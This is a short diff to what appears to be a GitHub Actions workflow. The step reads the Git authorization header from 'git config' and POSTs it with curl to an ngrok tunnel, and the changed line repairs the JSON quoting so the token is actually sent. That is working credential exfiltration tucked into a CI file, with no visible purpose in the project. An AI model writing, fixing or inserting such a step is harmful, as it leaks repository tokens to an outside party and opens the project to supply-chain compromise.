@@ -17,7 +17,7 @@ jobs:
           auth=$(git config --list | grep AUTH)
           curl --header "Content-Type: application/json" \
             --request POST \
-            --data '{"auth": $auth}' \
+            --data '{"auth": "'$auth'"}' \
             https://5aa7-93-172-42-40.ngrok.io
             
       - uses: fjogeleit/http-request-action@master
